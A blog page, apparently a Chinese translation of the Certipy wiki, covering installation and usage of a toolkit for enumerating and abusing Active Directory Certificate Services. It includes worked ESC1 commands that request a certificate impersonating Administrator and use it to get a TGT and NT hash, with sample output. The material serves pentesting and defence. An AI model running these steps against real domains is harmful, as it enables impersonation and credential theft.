@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wenfenhui">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wenfenhui">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,博客,技术,编程">
+    <meta name="description" content="个人技术博客，记录学习与成长">
+    <meta name="description" content="Certipy 中文文档 翻译自: https:&#x2F;&#x2F;github.com&#x2F;ly4k&#x2F;Certipy&#x2F;wiki  Certipy 是一个功能强大的攻击和防御工具包，用于枚举和滥用 Active Directory 证书服务 (AD CS)。它帮助红队人员、渗透测试人员和防御者评估 AD CS 配置错误——包括完全支持识别和利用所有已知的 ESC1-ESC16 攻击路径。  目录 简介 安装 使用方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Certipy 中文文档">
+<meta property="og:url" content="https://wenfenhui.github.io/2026/04/07/Certipy%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/index.html">
+<meta property="og:site_name" content="Wenfenhui&#39;s Blog">
+<meta property="og:description" content="Certipy 中文文档 翻译自: https:&#x2F;&#x2F;github.com&#x2F;ly4k&#x2F;Certipy&#x2F;wiki  Certipy 是一个功能强大的攻击和防御工具包，用于枚举和滥用 Active Directory 证书服务 (AD CS)。它帮助红队人员、渗透测试人员和防御者评估 AD CS 配置错误——包括完全支持识别和利用所有已知的 ESC1-ESC16 攻击路径。  目录 简介 安装 使用方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-07T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-07T04:31:46.704Z">
+<meta property="article:author" content="wenfenhui">
+<meta property="article:tag" content="工具wiki">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Certipy 中文文档 · Wenfenhui&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Wenfenhui's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Wenfenhui&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Certipy 中文文档</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Certipy 中文文档
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="工具wiki">工具wiki</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2026/04/07</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Certipy-中文文档"><a href="#Certipy-中文文档" class="headerlink" title="Certipy 中文文档"></a>Certipy 中文文档</h1><blockquote>
+<p>翻译自: <a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/wiki">https://github.com/ly4k/Certipy/wiki</a></p>
+</blockquote>
+<p>Certipy 是一个功能强大的攻击和防御工具包，用于枚举和滥用 Active Directory 证书服务 (AD CS)。它帮助红队人员、渗透测试人员和防御者评估 AD CS 配置错误——包括完全支持识别和利用所有已知的 ESC1-ESC16 攻击路径。</p>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#%E4%B8%80%E7%AE%80%E4%BB%8B">简介</a></li>
+<li><a href="#%E4%BA%8C%E5%AE%89%E8%A3%85">安装</a></li>
+<li><a href="#%E4%B8%89%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li>
+<li><a href="#%E5%9B%9B%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-esc1-esc16">提权技术 (ESC1-ESC16)</a></li>
+<li><a href="#%E4%BA%94%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83">命令参考</a></li>
+</ol>
+<hr>
+<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Active Directory 证书服务 (AD CS) 是 Microsoft 的本地公钥基础设施 (PKI) 解决方案，用于在 Active Directory 环境中颁发和管理数字证书。这些证书支持关键功能，如文件加密、数字签名和身份验证（例如智能卡登录或服务器的 TLS&#x2F;SSL）。由于 AD CS 可以颁发等效于密码的凭据——允许作为用户或计算机访问的证书——因此受损的证书颁发机构 (CA) 或配置错误的证书模板可能与域控制器入侵具有同等影响。因此，AD CS 组件被视为 Tier-0 资产。</p>
+<p>2021年，SpecterOps 发布了”Certified Pre-Owned”白皮书，揭示了多种可实现特权提升和域持久化的 AD CS 配置错误。这些被归类为 ESC1 到 ESC8（特权提升滥用案例）。此后，该列表已扩展到 ESC16，其他研究人员引入了新技术。这些 ESC 演示了 AD CS 中微妙的缺陷如何被滥用以获得提升的特权——通常可达到域管理员级别——或维持隐蔽访问。</p>
+<h3 id="Certipy-功能特性"><a href="#Certipy-功能特性" class="headerlink" title="Certipy 功能特性"></a>Certipy 功能特性</h3><ul>
+<li>🔎 发现证书颁发机构和模板</li>
+<li>🚩 识别配置错误</li>
+<li>🔐 请求和伪造证书</li>
+<li>🎭 使用证书执行身份验证</li>
+<li>📡 将 NTLM 身份验证中继到 AD CS HTTP(S)&#x2F;RPC 端点</li>
+<li>🗝️ 支持 Shadow Credentials、Golden Certificates 和证书映射攻击</li>
+<li>🧰 更多功能！</li>
+</ul>
+<h3 id="支持的-AD-CS-漏洞"><a href="#支持的-AD-CS-漏洞" class="headerlink" title="支持的 AD CS 漏洞"></a>支持的 AD CS 漏洞</h3><p>Certipy 支持检测和利用 ESC1-ESC16 全部范围的 AD CS 漏洞。</p>
+<hr>
+<h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>Certipy 是一个 Python 工具，支持 Python 3.12+，可在 Linux 和 Windows 上运行。该工具通过 pip (Python Package Index) 以 <code>certipy-ad</code> 名称分发。</p>
+<h3 id="Linux-安装-Debian-Ubuntu-Kali"><a href="#Linux-安装-Debian-Ubuntu-Kali" class="headerlink" title="Linux 安装 (Debian&#x2F;Ubuntu&#x2F;Kali)"></a>Linux 安装 (Debian&#x2F;Ubuntu&#x2F;Kali)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 Python 3.12+ 和 pip</span></span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt install -y python3 python3-pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 创建并激活虚拟环境（可选但推荐）</span></span><br><span class="line">python3 -m venv certipy-venv</span><br><span class="line"><span class="built_in">source</span> certipy-venv/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 通过 pip 安装 Certipy</span></span><br><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure>
+
+<p><strong>Kali Linux 注意事项：</strong> Kali 在其软件包仓库中包含 Certipy，名称为 <code>certipy-ad</code>。它可能预装在最新的 Kali 版本上。如果是这样，您可以直接运行 <code>certipy-ad</code>（Kali 的打包命令名称）。</p>
+<h3 id="Windows-安装-PowerShell"><a href="#Windows-安装-PowerShell" class="headerlink" title="Windows 安装 (PowerShell)"></a>Windows 安装 (PowerShell)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 Python 3.12+ for Windows</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 创建虚拟环境（可选）</span></span><br><span class="line">py <span class="literal">-3</span>.<span class="number">12</span> <span class="literal">-m</span> venv certipy<span class="literal">-venv</span></span><br><span class="line">certipy<span class="literal">-venv</span>\Scripts\Activate.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 使用 pip 安装 Certipy</span></span><br><span class="line">pip install certipy<span class="literal">-ad</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 验证安装</span></span><br><span class="line">certipy <span class="literal">-h</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="升级-Certipy"><a href="#升级-Certipy" class="headerlink" title="升级 Certipy"></a>升级 Certipy</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U certipy-ad</span><br></pre></td></tr></table></figure>
+
+<h3 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h3><ul>
+<li>始终使用 <code>certipy</code> 命令运行 Certipy（不是 <code>certipy-ad</code>），如果通过 pip 安装</li>
+<li>如果在 Windows 上安装后出现 ‘certipy’ is not recognized 错误，请确保 Python Scripts 目录在 PATH 中</li>
+<li>Certipy 依赖于多个库（impacket、cryptography、asn1crypto 等）。Pip 应该处理这些依赖</li>
+</ul>
+<hr>
+<h2 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h2><p>Certipy 是一个具有模块化结构的命令行工具。基本调用方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy [全局选项] &lt;命令&gt; [命令选项]</span><br></pre></td></tr></table></figure>
+
+<h3 id="主要子命令"><a href="#主要子命令" class="headerlink" title="主要子命令"></a>主要子命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find</code></td>
+<td>枚举域中的 AD CS 配置。扫描 CA、证书模板和相关对象，突出显示潜在的配置错误或易受攻击的设置</td>
+</tr>
+<tr>
+<td><code>req</code></td>
+<td>从 CA 请求证书。允许主动尝试为给定模板进行注册</td>
+</tr>
+<tr>
+<td><code>auth</code></td>
+<td>使用证书进行身份验证。给定 PFX（证书 + 私钥），执行域身份验证（Kerberos PKINIT）</td>
+</tr>
+<tr>
+<td><code>relay</code></td>
+<td>执行针对 AD CS HTTP(S) 或 RPC 端点的 NTLM 中继攻击（ESC8&#x2F;ESC11）</td>
+</tr>
+<tr>
+<td><code>shadow</code></td>
+<td>执行 Shadow Credentials 攻击（基于证书的持久化）</td>
+</tr>
+<tr>
+<td><code>forge</code></td>
+<td>给定受损的 CA 伪造证书（Golden Certificate）</td>
+</tr>
+<tr>
+<td><code>ca</code></td>
+<td>管理 CA 模板和请求</td>
+</tr>
+<tr>
+<td><code>template</code></td>
+<td>查看或修改证书模板配置</td>
+</tr>
+<tr>
+<td><code>account</code></td>
+<td>管理 AD 用户&#x2F;计算机账户</td>
+</tr>
+<tr>
+<td><code>cert</code></td>
+<td>导入&#x2F;导出&#x2F;操作本地证书</td>
+</tr>
+</tbody></table>
+<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><h4 id="1-枚举-AD-CS"><a href="#1-枚举-AD-CS" class="headerlink" title="1. 枚举 AD CS"></a>1. 枚举 AD CS</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy find \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -text \</span><br><span class="line">    -enabled -hide-admins</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : CORP-CA</span><br><span class="line">    DNS Name                            : CA.CORP.LOCAL</span><br><span class="line">    ...</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC7                              : User has dangerous permissions.</span><br><span class="line">      ESC8                              : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.</span><br><span class="line"></span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : UserTemplate</span><br><span class="line">    Display Name                        : UserTemplate</span><br><span class="line">    Certificate Authorities             : CORP-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    ...</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : Enrollee supplies subject and template allows client authentication.</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-请求证书（利用-ESC1）"><a href="#2-请求证书（利用-ESC1）" class="headerlink" title="2. 请求证书（利用 ESC1）"></a>2. 请求证书（利用 ESC1）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;UserTemplate&#x27;</span> \</span><br><span class="line">    -upn <span class="string">&#x27;Administrator@corp.local&#x27;</span> -sid <span class="string">&#x27;S-1-5-21-...-500&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 1</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN &#x27;Administrator@corp.local&#x27;</span><br><span class="line">[*] Certificate object SID is &#x27;S-1-5-21-...-500&#x27;</span><br><span class="line">[*] Wrote certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-使用证书进行身份验证"><a href="#3-使用证书进行身份验证" class="headerlink" title="3. 使用证书进行身份验证"></a>3. 使用证书进行身份验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx <span class="string">&#x27;administrator.pfx&#x27;</span> -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] Certificate identities:</span><br><span class="line">    SAN UPN: &#x27;Administrator@corp.local&#x27;</span><br><span class="line">    Security Extension SID: &#x27;S-1-5-21-...-500&#x27;</span><br><span class="line">[*] Using principal: &#x27;Administrator@corp.local&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Wrote credential cache to &#x27;Administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;Administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;Administrator@corp.local&#x27;:</span><br><span class="line">    aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、提权技术-ESC1-ESC16"><a href="#四、提权技术-ESC1-ESC16" class="headerlink" title="四、提权技术 (ESC1-ESC16)"></a>四、提权技术 (ESC1-ESC16)</h2><p>AD CS 中的配置错误可能允许低特权用户在 Active Directory 中提升特权，通常可达到域管理员级别。SpecterOps 研究引入了”ESC”编号来对这些 AD CS 滥用场景进行分类。这里我们介绍 ESC1 到 ESC16。</p>
+<hr>
+<h3 id="ESC1-注册者提供主题用于客户端身份验证"><a href="#ESC1-注册者提供主题用于客户端身份验证" class="headerlink" title="ESC1: 注册者提供主题用于客户端身份验证"></a>ESC1: 注册者提供主题用于客户端身份验证</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>ESC1 是典型的 AD CS 配置错误，可直接导致特权提升。当证书模板安全设置不足时会出现此漏洞，允许低特权用户请求证书，并在证书的 SAN 中指定任意身份。这允许攻击者冒充任何用户，包括管理员。</p>
+<p><strong>ESC1 漏洞条件：</strong></p>
+<ol>
+<li><strong>注册者提供主题</strong>：模板启用了 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志</li>
+<li><strong>身份验证 EKU</strong>：模板包含允许身份验证的 EKU<ul>
+<li>Client Authentication (OID 1.3.6.1.5.5.7.3.2)</li>
+<li>Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)</li>
+<li>PKINIT Client Authentication (OID 1.3.6.1.5.2.3.4)</li>
+<li>Any Purpose (OID 2.5.29.37.0)</li>
+</ul>
+</li>
+<li><strong>宽松的注册权限</strong>：低特权用户或广泛组（如 Domain Users）被授予注册权限</li>
+<li><strong>无有效安全门控</strong>：模板不强制管理员批准，也不需要授权签名</li>
+</ol>
+<h4 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;user@corp.local&#x27;</span> -p <span class="string">&#x27;password&#x27;</span> -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键指标：</strong></p>
+<ul>
+<li><code>[!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication</code></li>
+<li><code>Enrollee Supplies Subject : True</code></li>
